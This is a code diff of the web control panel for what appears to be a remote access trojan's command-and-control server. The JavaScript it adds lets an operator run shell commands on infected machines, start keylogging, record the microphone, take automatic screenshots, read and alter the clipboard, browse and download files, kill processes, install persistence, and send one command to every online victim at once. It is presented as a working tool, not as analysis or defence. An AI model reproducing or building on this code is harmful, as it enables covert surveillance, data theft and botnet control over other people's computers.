+  out.innerHTML+=`<span class="shell-prompt-line">$ ${esc(cmd)}</span>\n`;
+  const res=await sendCmdRaw('shell',{cmd});
   if(res.status==='ok'){
-    if(res.stdout) out.innerHTML += `<span class="shell-stdout">${esc(res.stdout)}</span>`;
-    if(res.stderr) out.innerHTML += `<span class="shell-stderr">${esc(res.stderr)}</span>`;
-    if(!res.stdout && !res.stderr) out.innerHTML += `<span style="color:var(--dim)">(no output, exit ${res.returncode})</span>\n`;
-  } else {
-    out.innerHTML += `<span class="shell-stderr">Error: ${esc(res.msg)}</span>\n`;
-  }
-  out.scrollTop = out.scrollHeight;
+    if(res.stdout) out.innerHTML+=`<span class="shell-stdout">${esc(res.stdout)}</span>`;
+    if(res.stderr) out.innerHTML+=`<span class="shell-stderr">${esc(res.stderr)}</span>`;
+    if(!res.stdout&&!res.stderr) out.innerHTML+=`<span style="color:var(--dim)">(exit ${res.returncode})</span>\n`;
+  } else { out.innerHTML+=`<span class="shell-stderr">Error: ${esc(res.msg)}</span>\n`; }
+  out.scrollTop=out.scrollHeight;
 }
 function clearShell(){ document.getElementById('shell-output').innerHTML=''; }
 
 // ── Keylog ──
 function startKeylog(){
   if(!selectedClient) return;
-  keylogging = true;
-  sendCmd('keylog_start');
-  document.getElementById('btn-kl-start').disabled = true;
-  document.getElementById('btn-kl-stop').disabled = false;
-  document.getElementById('kl-status').textContent = '● RECORDING';
-  document.getElementById('kl-status').style.color = 'var(--accent)';
+  keylogging=true; sendCmd('keylog_start');
+  document.getElementById('btn-kl-start').disabled=true;
+  document.getElementById('btn-kl-stop').disabled=false;
+  document.getElementById('kl-status').textContent='● REC';
+  document.getElementById('kl-status').style.color='var(--accent)';
 }
 function stopKeylog(){
-  if(!selectedClient) return;
-  keylogging = false;
-  sendCmd('keylog_stop');
-  document.getElementById('btn-kl-start').disabled = false;
-  document.getElementById('btn-kl-stop').disabled = true;
-  document.getElementById('kl-status').textContent = 'STOPPED';
-  document.getElementById('kl-status').style.color = 'var(--dim)';
+  keylogging=false; sendCmd('keylog_stop');
+  document.getElementById('btn-kl-start').disabled=false;
+  document.getElementById('btn-kl-stop').disabled=true;
+  document.getElementById('kl-status').textContent='STOPPED';
+  document.getElementById('kl-status').style.color='var(--dim)';
 }
 function clearKeylog(){ document.getElementById('keylog-output').innerHTML=''; }
-
-// ── Clipboard ──
-async function getClipboard(){
-  const res = await sendCmdRaw('clipboard_get');
-  const el = document.getElementById('clip-display');
-  if(res.status==='ok'){ el.textContent = res.data || '(empty)'; }
-  else { el.textContent = 'Error: '+(res.msg||'unknown'); }
-}
-async function setClipboard(){
-  const text = document.getElementById('clip-input').value;
-  const res = await sendCmdRaw('clipboard_set', {text});
-  if(res.status==='ok') addLog('Clipboard set on target','info');
-  else addLog('Clipboard set failed: '+res.msg,'error');
-}
-function copyClipDisplay(){
-  const text = document.getElementById('clip-display').textContent;
+function copyKeylog(){
+  const text=document.getElementById('keylog-output').innerText;
   navigator.clipboard.writeText(text).catch(()=>{});
 }
 
-// ── File browser ──
-function fbHome(){
-  if(!selectedClient){ addLog('No client selected','error'); return; }
-  // request ls with empty path — server/client will use home dir
-  fbFetch('');
+// ── Mic ──
+async function startMic(){
+  const dur=parseInt(document.getElementById('mic-duration').value)||10;
+  document.getElementById('mic-status').textContent='● RECORDING...';
+  document.getElementById('mic-status').style.color='var(--danger)';
+  const res=await sendCmdRaw('mic_record',{duration:dur});
+  if(res.status!=='ok') { document.getElementById('mic-status').textContent='Error: '+res.msg; }
 }
+function stopMic(){ sendCmd('mic_stop'); document.getElementById('mic-status').textContent='STOPPED'; document.getElementById('mic-status').style.color='var(--dim)'; }
+
+// ── Clipboard ──
+async function getClipboard(){
+  const res=await sendCmdRaw('clipboard_get');
+  document.getElementById('clip-display').textContent=res.status==='ok'?(res.data||'(empty)'):'Error: '+res.msg;
+}
+async function setClipboard(){
+  const text=document.getElementById('clip-input').value;
+  const res=await sendCmdRaw('clipboard_set',{text});
+  addLog(res.status==='ok'?'Clipboard set':'Clipboard failed: '+res.msg, res.status==='ok'?'info':'error');
+}
+function copyClipDisplay(){ navigator.clipboard.writeText(document.getElementById('clip-display').textContent).catch(()=>{}); }
+
+// ── File browser ──
+function fbHome(){ if(!selectedClient){addLog('No client','error');return;} fbFetch(''); }
 async function fbFetch(path){
   if(!selectedClient) return;
-  const res = await sendCmdRaw('ls', {path: path || ''});
-  if(res.status==='ok'){
-    fbCurrentPath = res.path || path;
-    document.getElementById('fb-path').value = fbCurrentPath;
-    renderFbList(res.data);
-  } else {
-    document.getElementById('fb-list').innerHTML = `<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`;
-  }
+  document.getElementById('fb-list').innerHTML='<div class="loading">Loading...</div>';
+  const res=await sendCmdRaw('ls',{path:path||''});
+  if(res.status==='ok'){ fbCurrentPath=res.path||path; document.getElementById('fb-path').value=fbCurrentPath; renderFbList(res.data); }
+  else { document.getElementById('fb-list').innerHTML=`<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`; }
 }
-function fbNavigate(){
-  const p = document.getElementById('fb-path').value.trim();
-  if(p) fbFetch(p);
-}
-function fbUp(){
-  if(!fbCurrentPath) return;
-  // Go up one directory
-  const parts = fbCurrentPath.replace(/[\/\\]$/, '').split(/[\/\\]/);
-  if(parts.length <= 1){ fbFetch('/'); return; }
-  parts.pop();
-  const newPath = parts.join('/') || '/';
-  fbFetch(newPath);
-}
+function fbNavigate(){ const p=document.getElementById('fb-path').value.trim(); if(p) fbFetch(p); }
+function fbUp(){ if(!fbCurrentPath) return; const parts=fbCurrentPath.replace(/[\/\\]$/,'').split(/[\/\\]/); if(parts.length<=1){fbFetch('/');return;} parts.pop(); fbFetch(parts.join('/')||'/'); }
 function renderFbList(items){
-  const list = document.getElementById('fb-list');
-  if(!items || !items.length){
-    list.innerHTML = '<div class="no-data">(empty directory)</div>'; return;
-  }
-  list.innerHTML = items.map(item => {
-    const icon = item.is_dir ? '📁' : '📄';
-    const size = item.is_dir ? '' : fmtSize(item.size);
+  const list=document.getElementById('fb-list');
+  if(!items||!items.length){list.innerHTML='<div class="no-data">(empty)</div>';return;}
+  list.innerHTML=items.map(item=>{
+    const icon=item.is_dir?'📁':'📄';
+    const size=item.is_dir?'':fmtSize(item.size);
     return `<div class="fb-item${item.is_dir?' is-dir':''}" onclick="${item.is_dir?`fbEnter('${esc2(item.name)}')`:``}">
-      <div class="fi-icon">${icon}</div>
-      <div class="fi-name">${esc(item.name)}</div>
-      <div class="fi-size">${size}</div>
-      <div class="fi-date">${item.modified}</div>
-      <div class="fi-actions">${!item.is_dir?`
+      <div class="fi-icon">${icon}</div><div class="fi-name">${esc(item.name)}</div>
+      <div class="fi-size">${size}</div><div class="fi-date">${item.modified}</div>
+      <div class="fi-act">${!item.is_dir?`
         <button class="btn btn-blue btn-sm" onclick="event.stopPropagation();fbRead('${esc2(item.name)}')">VIEW</button>
-        <button class="btn btn-green btn-sm" onclick="event.stopPropagation();fbDownload('${esc2(item.name)}')">DL</button>
-      `:''}</div>
+        <button class="btn btn-green btn-sm" onclick="event.stopPropagation();fbDownload('${esc2(item.name)}')">DL</button>`:''}</div>
     </div>`;
   }).join('');
 }
-function fbEnter(name){
-  const sep = fbCurrentPath.includes('\\') ? '\\' : '/';
-  const newPath = fbCurrentPath.replace(/[\/\\]$/, '') + sep + name;
-  fbFetch(newPath);
-}
+function fbEnter(name){ const sep=fbCurrentPath.includes('\\')?'\\':'/'; fbFetch(fbCurrentPath.replace(/[\/\\]$/,'')+sep+name); }
 async function fbRead(name){
-  const sep = fbCurrentPath.includes('\\') ? '\\' : '/';
-  const path = fbCurrentPath.replace(/[\/\\]$/, '') + sep + name;
-  const res = await sendCmdRaw('read_file', {path});
-  if(res.status==='ok'){
-    const w = window.open('','_blank','width=800,height=600');
-    w.document.write(`<pre style="background:#080c10;color:#c9d1d9;padding:20px;font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;">${esc(res.data)}</pre>`);
-  } else { alert('Error: '+res.msg); }
+  const sep=fbCurrentPath.includes('\\')?'\\':'/';
+  const path=fbCurrentPath.replace(/[\/\\]$/,'')+sep+name;
+  const res=await sendCmdRaw('read_file',{path});
+  if(res.status==='ok'){ const w=window.open('','_blank','width=800,height=600'); w.document.write(`<pre style="background:#080c10;color:#c9d1d9;padding:20px;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;">${esc(res.data)}</pre>`); }
+  else alert('Error: '+res.msg);
 }
 async function fbDownload(name){
-  const sep = fbCurrentPath.includes('\\') ? '\\' : '/';
-  const path = fbCurrentPath.replace(/[\/\\]$/, '') + sep + name;
-  const res = await sendCmdRaw('download_file', {path});
+  const sep=fbCurrentPath.includes('\\')?'\\':'/';
+  const path=fbCurrentPath.replace(/[\/\\]$/,'')+sep+name;
+  const res=await sendCmdRaw('download_file',{path});
+  if(res.status==='ok'){ const a=document.createElement('a'); a.href='data:application/octet-stream;base64,'+res.data; a.download=res.filename||name; a.click(); }
+  else alert('Error: '+res.msg);
+}
+
+// ── Network ──
+async function getNetinfo(){
+  document.getElementById('net-content').innerHTML='<div class="loading">Loading...</div>';
+  const res=await sendCmdRaw('netinfo');
   if(res.status==='ok'){
-    const a = document.createElement('a');
-    a.href = 'data:application/octet-stream;base64,'+res.data;
-    a.download = res.filename || name;
-    a.click();
-  } else { alert('Error: '+res.msg); }
+    const d=res.data;
+    let html='';
+    if(d.io){
+      html+=`<div class="net-section"><div class="net-title">I/O Stats</div>
+        <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:4px;">
+          ${[['Sent',fmtSize(d.io.bytes_sent)],['Received',fmtSize(d.io.bytes_recv)],['Pkts Out',d.io.packets_sent],['Pkts In',d.io.packets_recv]].map(([l,v])=>`
+          <div style="background:var(--panel2);border:1px solid var(--border);padding:10px;">
+            <div style="font-size:9px;color:var(--dim);letter-spacing:2px;margin-bottom:4px;">${l}</div>
+            <div style="font-size:14px;color:var(--accent2);">${v}</div>
+          </div>`).join('')}
+        </div></div>`;
+    }
+    if(d.interfaces&&d.interfaces.length){
+      html+=`<div class="net-section"><div class="net-title">Interfaces</div>
+        ${d.interfaces.map(i=>`<div class="net-iface"><span class="ni-name">${esc(i.iface)}</span><span class="ni-ip">${esc(i.ip)}</span><span class="ni-mask">${esc(i.netmask)}</span></div>`).join('')}
+      </div>`;
+    }
+    if(d.connections&&d.connections.length){
+      html+=`<div class="net-section"><div class="net-title">Connections (${d.connections.length})</div>
+        <table><thead><tr><th>Proto</th><th>Local</th><th>Remote</th><th>Status</th><th>PID</th><th>Process</th></tr></thead>
+        <tbody>${d.connections.map(c=>`<tr>
+          <td><span class="tag ${c.proto==='TCP'?'tag-blue':'tag-green'}">${c.proto}</span></td>
+          <td style="font-size:10px">${esc(c.laddr)}</td>
+          <td style="font-size:10px;color:var(--accent2)">${esc(c.raddr)||'—'}</td>
+          <td style="font-size:10px;color:${c.status==='ESTABLISHED'?'var(--accent)':'var(--dim)'}">${esc(c.status)}</td>
+          <td style="font-size:10px;color:var(--dim)">${c.pid||''}</td>
+          <td style="font-size:10px">${esc(c.proc)}</td>
+        </tr>`).join('')}</tbody></table>
+      </div>`;
+    }
+    document.getElementById('net-content').innerHTML=html||'<div class="no-data">No data</div>';
+  } else {
+    document.getElementById('net-content').innerHTML=`<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`;
+  }
 }
 
 // ── Sysinfo ──
 async function getSysinfo(){
-  document.getElementById('sysinfo-content').innerHTML = '<div class="loading">Loading...</div>';
-  const res = await sendCmdRaw('sysinfo');
+  document.getElementById('sysinfo-content').innerHTML='<div class="loading">Loading...</div>';
+  const res=await sendCmdRaw('sysinfo');
   if(res.status==='ok'){
-    const d = res.data;
-    const cpuColor = d.cpu_percent>80?'danger':d.cpu_percent>50?'warn':'';
-    const ramColor = d.ram_percent>80?'danger':d.ram_percent>60?'warn':'';
-    const diskColor = d.disk_percent>90?'danger':d.disk_percent>70?'warn':'';
-    document.getElementById('sysinfo-content').innerHTML = `
-      <div class="sysinfo-grid">
-        <div class="si-card"><div class="si-label">Hostname</div><div class="si-value accent2">${esc(d.hostname)}</div></div>
-        <div class="si-card"><div class="si-label">Username</div><div class="si-value">${esc(d.username)}</div></div>
-        <div class="si-card"><div class="si-label">Platform</div><div class="si-value">${esc(d.platform)}</div></div>
-        <div class="si-card"><div class="si-label">IP Address</div><div class="si-value accent2">${esc(d.ip)}</div></div>
-        <div class="si-card"><div class="si-label">CPU Usage</div>
-          <div class="si-value accent">${d.cpu_percent}%</div>
-          <div class="progress-bar"><div class="progress-fill ${cpuColor}" style="width:${d.cpu_percent}%"></div></div></div>
-        <div class="si-card"><div class="si-label">RAM ${d.ram_used}GB / ${d.ram_total}GB</div>
-          <div class="si-value accent">${d.ram_percent}%</div>
-          <div class="progress-bar"><div class="progress-fill ${ramColor}" style="width:${d.ram_percent}%"></div></div></div>
-        <div class="si-card"><div class="si-label">Disk ${d.disk_used}GB / ${d.disk_total}GB</div>
-          <div class="si-value accent">${d.disk_percent}%</div>
-          <div class="progress-bar"><div class="progress-fill ${diskColor}" style="width:${d.disk_percent}%"></div></div></div>
-        <div class="si-card"><div class="si-label">Processes</div><div class="si-value accent2">${d.process_count}</div></div>
-        <div class="si-card" style="grid-column:span 2"><div class="si-label">Boot Time</div><div class="si-value">${esc(d.boot_time)}</div></div>
-      </div>`;
-  } else {
-    document.getElementById('sysinfo-content').innerHTML = `<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`;
-  }
+    const d=res.data;
+    const cc=v=>v>80?'danger':v>50?'warn':'';
+    document.getElementById('sysinfo-content').innerHTML=`<div class="sysinfo-grid">
+      <div class="si-card"><div class="si-label">Hostname</div><div class="si-value accent2">${esc(d.hostname)}</div></div>
+      <div class="si-card"><div class="si-label">Username</div><div class="si-value">${esc(d.username)}</div></div>
+      <div class="si-card"><div class="si-label">Platform</div><div class="si-value">${esc(d.platform)}</div></div>
+      <div class="si-card"><div class="si-label">IP</div><div class="si-value accent2">${esc(d.ip)}</div></div>
+      <div class="si-card"><div class="si-label">CPU</div><div class="si-value accent">${d.cpu_percent}%</div>
+        <div class="progress-bar"><div class="progress-fill ${cc(d.cpu_percent)}" style="width:${d.cpu_percent}%"></div></div></div>
+      <div class="si-card"><div class="si-label">RAM ${d.ram_used}/${d.ram_total} GB</div><div class="si-value accent">${d.ram_percent}%</div>
+        <div class="progress-bar"><div class="progress-fill ${cc(d.ram_percent)}" style="width:${d.ram_percent}%"></div></div></div>
+      <div class="si-card"><div class="si-label">Disk ${d.disk_used}/${d.disk_total} GB</div><div class="si-value accent">${d.disk_percent}%</div>
+        <div class="progress-bar"><div class="progress-fill ${cc(d.disk_percent)}" style="width:${d.disk_percent}%"></div></div></div>
+      <div class="si-card"><div class="si-label">Processes</div><div class="si-value accent2">${d.process_count}</div></div>
+      <div class="si-card" style="grid-column:span 2"><div class="si-label">Boot Time</div><div class="si-value">${esc(d.boot_time)}</div></div>
+    </div>`;
+  } else { document.getElementById('sysinfo-content').innerHTML=`<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`; }
 }
 
 // ── Processes ──
 async function getProcesses(){
-  document.getElementById('proc-content').innerHTML = '<div class="loading">Loading...</div>';
-  const res = await sendCmdRaw('processes');
-  if(res.status==='ok'){
-    const procs = res.data;
-    document.getElementById('proc-content').innerHTML = `
-      <table class="proc-table"><thead><tr>
-        <th>PID</th><th>Name</th><th>CPU%</th><th>MEM%</th><th>Status</th><th>Kill</th>
-      </tr></thead><tbody>${procs.map(p=>`<tr>
-        <td style="color:var(--dim)">${p.pid}</td>
-        <td>${esc(p.name||'')}</td>
-        <td style="color:${(p.cpu_percent||0)>20?'var(--warn)':'var(--text)'}">${(p.cpu_percent||0).toFixed(1)}</td>
-        <td>${(p.memory_percent||0).toFixed(1)}</td>
-        <td style="color:var(--dim);font-size:10px">${esc(p.status||'')}</td>
-        <td><button class="btn btn-red btn-sm" onclick="killProc(${p.pid})">KILL</button></td>
-      </tr>`).join('')}</tbody></table>`;
-  } else {
-    document.getElementById('proc-content').innerHTML = `<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`;
-  }
+  document.getElementById('proc-content').innerHTML='<div class="loading">Loading...</div>';
+  const res=await sendCmdRaw('processes');
+  if(res.status==='ok'){ allProcs=res.data; renderProcs(allProcs); }
+  else document.getElementById('proc-content').innerHTML=`<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`;
+}
+function filterProcs(){
+  const q=document.getElementById('proc-filter').value.toLowerCase();
+  renderProcs(allProcs.filter(p=>(p.name||'').toLowerCase().includes(q)||String(p.pid).includes(q)));
+}
+function renderProcs(procs){
+  document.getElementById('proc-content').innerHTML=`<table class="proc-table"><thead><tr>
+    <th>PID</th><th>Name</th><th>CPU%</th><th>MEM%</th><th>Status</th><th></th>
+  </tr></thead><tbody>${procs.map(p=>`<tr>
+    <td style="color:var(--dim)">${p.pid}</td>
+    <td>${esc(p.name||'')}</td>
+    <td style="color:${(p.cpu_percent||0)>20?'var(--warn)':'var(--text)'}">${(p.cpu_percent||0).toFixed(1)}</td>
+    <td>${(p.memory_percent||0).toFixed(1)}</td>
+    <td style="color:var(--dim);font-size:10px">${esc(p.status||'')}</td>
+    <td><button class="btn btn-red btn-sm" onclick="killProc(${p.pid})">KILL</button></td>
+  </tr>`).join('')}</tbody></table>`;
 }
 async function killProc(pid){
   if(!confirm(`Kill PID ${pid}?`)) return;
-  const res = await sendCmdRaw('kill_process', {pid});
+  const res=await sendCmdRaw('kill_process',{pid});
   addLog(res.status==='ok'?`Killed PID ${pid}`:`Kill failed: ${res.msg}`, res.status==='ok'?'info':'error');
   getProcesses();
 }
 
+// ── Auto Screenshots ──
+function startAutoSS(){
+  if(!selectedClient) return;
+  const interval=parseInt(document.getElementById('ss-interval').value)||30;
+  autoSS=true;
+  sendCmd('auto_ss_start',{interval});
+  document.getElementById('btn-ss-start').disabled=true;
+  document.getElementById('btn-ss-stop').disabled=false;
+  document.getElementById('ss-status').textContent='ACTIVE every '+interval+'s';
+  document.getElementById('ss-status').style.color='var(--accent)';
+}
+function stopAutoSS(){
+  autoSS=false; sendCmd('auto_ss_stop');
+  document.getElementById('btn-ss-start').disabled=false;
+  document.getElementById('btn-ss-stop').disabled=true;
+  document.getElementById('ss-status').textContent='STOPPED';
+  document.getElementById('ss-status').style.color='var(--dim)';
+}
+function clearAutoSS(){
+  const g=document.getElementById('ss-gallery');
+  g.innerHTML='<div class="no-data" style="grid-column:1/-1;">Screenshots will appear here</div>';
+}
+
+// ── Chat ──
+async function sendChat(){
+  const inp=document.getElementById('chat-input');
+  const msg=inp.value.trim();
+  if(!msg||!selectedClient) return;
+  inp.value='';
+  const res=await sendCmdRaw('chat_msg',{msg});
+  const container=document.getElementById('chat-messages');
+  const noData=container.querySelector('.no-data');
+  if(noData) noData.remove();
+  const div=document.createElement('div');
+  div.className='chat-msg';
+  div.innerHTML=`<div class="cm-time">${new Date().toTimeString().slice(0,8)} · ${res.status==='ok'?'<span style="color:var(--accent)">DELIVERED</span>':'<span style="color:var(--warn)">FAILED</span>'}</div><div class="cm-text">${esc(msg)}</div>`;
+  container.appendChild(div);
+  container.scrollTop=container.scrollHeight;
+}
+
+// ── Persist ──
+async function persistInstall(){
+  if(!selectedClient) return;
+  document.getElementById('persist-result').textContent='Installing...';
+  const res=await sendCmdRaw('persist_install');
+  document.getElementById('persist-result').innerHTML=`<span style="color:${res.status==='ok'?'var(--accent)':'var(--warn)'}">${esc(res.msg)}</span>`;
+}
+async function persistRemove(){
+  if(!selectedClient) return;
+  document.getElementById('persist-result').textContent='Removing...';
+  const res=await sendCmdRaw('persist_remove');
+  document.getElementById('persist-result').innerHTML=`<span style="color:${res.status==='ok'?'var(--accent)':'var(--warn)'}">${esc(res.msg)}</span>`;
+}
+
+// ── Mass Command ──
+function openMassCmd(){ document.getElementById('mass-overlay').classList.add('open'); }
+document.getElementById('mass-overlay').addEventListener('click',e=>{ if(e.target===document.getElementById('mass-overlay')) document.getElementById('mass-overlay').classList.remove('open'); });
+async function runMassCmd(){
+  const action=document.getElementById('mass-action').value;
+  const param=document.getElementById('mass-param').value.trim();
+  const online=clients.filter(c=>c.status==='online');
+  if(!online.length){ alert('No online nodes'); return; }
+  const results=document.getElementById('mass-results');
+  results.innerHTML='<div class="loading">Executing on '+online.length+' nodes...</div>';
+  const extra={};
+  if(action==='shell') extra.cmd=param;
+  else if(action==='alert') extra.msg=param;
+  else if(action==='open_url') extra.url=param;
+  const jobs=online.map(c=>{
+    return new Promise(resolve=>{
+      const rid=Math.random().toString(36).slice(2);
+      pendingCmds[rid]=resolve;
+      socket.emit('cmd',{client_id:c.id,action,rid,...extra});
+      setTimeout(()=>{ if(pendingCmds[rid]){delete pendingCmds[rid];resolve({status:'error',msg:'Timeout',_host:c.hostname});} },15000);
+    }).then(res=>({...res,_host:c.hostname}));
+  });
+  const all=await Promise.all(jobs);
+  results.innerHTML=all.map(r=>`<div class="mass-result">
+    <div class="mr-host">${esc(r._host)} <span style="color:${r.status==='ok'?'var(--accent)':'var(--warn)'}">[${r.status}]</span></div>
+    ${r.stdout?`<div class="mr-out">${esc(r.stdout)}</div>`:''}
+    ${r.stderr?`<div class="mr-err">${esc(r.stderr)}</div>`:''}
+    ${r.msg?`<div class="${r.status==='ok'?'mr-out':'mr-err'}">${esc(r.msg)}</div>`:''}
+  </div>`).join('');
+}
+
 // ── Log ──
-function addLog(msg, type='info'){
-  const log = document.getElementById('log');
-  const time = new Date().toTimeString().slice(0,8);
-  const line = document.createElement('div');
-  line.className = 'log-line';
-  line.innerHTML = `<span class="log-time">[${time}]</span><span class="log-msg ${type}">${esc(msg)}</span>`;
-  log.appendChild(line);
-  log.scrollTop = log.scrollHeight;
-  while(log.children.length > 80) log.removeChild(log.firstChild);
+function addLog(msg,type='info'){
+  const log=document.getElementById('log');
+  const line=document.createElement('div');
+  line.className='log-line';
+  line.innerHTML=`<span class="log-time">[${new Date().toTimeString().slice(0,8)}]</span><span class="log-msg ${type}">${esc(msg)}</span>`;
+  log.appendChild(line); log.scrollTop=log.scrollHeight;
+  while(log.children.length>80) log.removeChild(log.firstChild);
 }
 
 // ── Utils ──
 function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
 function esc2(s){ return String(s||'').replace(/'/g,"\\'"); }
-function fmtSize(b){
-  if(b<1024) return b+'B';
-  if(b<1048576) return (b/1024).toFixed(1)+'KB';
-  if(b<1073741824) return (b/1048576).toFixed(1)+'MB';
-  return (b/1073741824).toFixed(1)+'GB';
-}
+function fmtSize(b){ if(b<1024)return b+'B'; if(b<1048576)return (b/1024).toFixed(1)+'KB'; if(b<1073741824)return (b/1048576).toFixed(1)+'MB'; return (b/1073741824).toFixed(1)+'GB'; }
+function b64toBlob(b64,type){ const bin=atob(b64); const arr=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++) arr[i]=bin.charCodeAt(i); return new Blob([arr],{type}); }
 </script>
 </body>
 </html>
